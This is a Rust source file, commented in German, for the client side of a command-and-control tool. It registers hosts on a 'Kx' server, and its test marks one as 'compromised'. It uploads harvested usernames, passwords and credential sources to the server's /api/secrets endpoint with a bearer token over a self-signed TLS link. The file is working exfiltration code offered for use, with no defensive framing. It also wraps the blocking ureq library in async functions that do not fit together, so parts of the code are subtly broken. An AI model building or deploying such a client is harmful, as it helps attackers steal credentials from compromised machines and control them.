//! C2-Kommunikation: Client für den Kx-Server.
//!
//! Nutzt ureq mit rustls für TLS-Requests mit Bearer-Token. Das
//! Server-Zertifikat wird via `server_cert` (PEM-Pfad) übergeben und
//! vertraut gemacht; eine Verifikation gegen die System-Store ist nicht
//! möglich, da der Server selbstsignierte Zertifikate verwendet.

use thiserror::Error;
use ureq::Agent;

/// Fehler bei der C2-Kommunikation.
#[derive(Debug, Error)]
pub enum C2Error {
    /// ureq-Request fehlgeschlagen.
    #[error("HTTP-Request fehlgeschlagen: {0}")]
    Http(String),
    /// TLS-Setup fehlgeschlagen.
    #[error("TLS-Setup fehlgeschlagen: {0}")]
    Tls(String),
    /// Antwort-JSON konnte nicht geparst werden.
    #[error("Antwort-JSON ungültig: {0}")]
    Json(String),
}

/// Payload für eine Host-Registrierung.
#[derive(Debug, serde::Serialize)]
pub struct HostPayload {
    pub ip: String,
    pub hostname: Option<String>,
    pub os: Option<String>,
    pub status: Option<String>,
}

/// Payload für ein Secret-Upload.
#[derive(Debug, serde::Serialize)]
pub struct SecretPayload {
    pub cred_type: String,
    pub username: String,
    pub password: String,
    pub source: String,
}

/// C2-Client mit ureq-Agent und Auth-Token.
pub struct C2Client {
    agent: Agent,
    base_url: String,
    token: String,
}

impl C2Client {
    /// Erzeugt einen Client für den angegebenen Server.
    ///
    /// `server_cert`: PEM-Pfad zum Server-Zertifikat (vertraut gemacht).
    pub fn new(
        server: &str,
        token: &str,
        server_cert: &str,
    ) -> Result<Self, C2Error> {
        let cert_pem = std::fs::read(server_cert)
            .map_err(|e| C2Error::Tls(format!("Zertifikat nicht lesbar: {e}")))?;
        let client_config = kx_tls::client_config_trusting(&cert_pem)
            .map_err(|e| C2Error::Tls(e.to_string()))?;
        let agent = ureq::AgentBuilder::new()
            .tls_config(client_config)
            .build();
        Ok(Self {
            agent,
            base_url: server.trim_end_matches('/').to_string(),
            token: token.to_string(),
        })
    }

    /// Registriert einen Host unter /api/register.
    pub async fn register_host(&self, host: &HostPayload) -> Result<(), C2Error> {
        let url = format!("{}/api/register", self.base_url);
        let resp = self
            .agent
            .post(&url)
            .set("Authorization", &format!("Bearer {}", self.token))
            .send_json(ureq::serde_json::to_value(host)
                .map_err(|e| C2Error::Json(e.to_string()))?)
            .map_err(|e| C2Error::Http(e.to_string()))?;
        ensure_ok(resp).await
    }

    /// Lädt ein Secret unter /api/secrets hoch.
    pub async fn upload_secret(
        &self,
        host_id: &str,
        secret: &SecretPayload,
    ) -> Result<(), C2Error> {
        let url = format!("{}/api/secrets", self.base_url);
        let body = serde_json::json!({
            "host_id": host_id,
            "cred_type": secret.cred_type,
            "username": secret.username,
            "password": secret.password,
            "source": secret.source,
        });
        let resp = self
            .agent
            .post(&url)
            .set("Authorization", &format!("Bearer {}", self.token))
            .send_json(body)
            .map_err(|e| C2Error::Http(e.to_string()))?;
        ensure_ok(resp).await
    }
}

/// Prüft den HTTP-Status; gibt bei Fehlern einen C2Error zurück.
async fn ensure_ok(resp: ureq::Response) -> Result<(), C2Error> {
    if resp.status() == 201 || resp.status() == 200 {
        Ok(())
    } else {
        let status = resp.status();
        let body = resp
            .into_string()
            .unwrap_or_else(|_| "<binär>".into());
        Err(C2Error::Http(format!("Status {status}: {body}")))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn host_payload_serializes() {
        let host = HostPayload {
            ip: "192.168.1.5".into(),
            hostname: Some("srv1".into()),
            os: Some("Windows".into()),
            status: Some("compromised".into()),
        };
        let v = ureq::serde_json::to_value(&host).unwrap();
        assert_eq!(v["ip"], "192.168.1.5");
    }
}
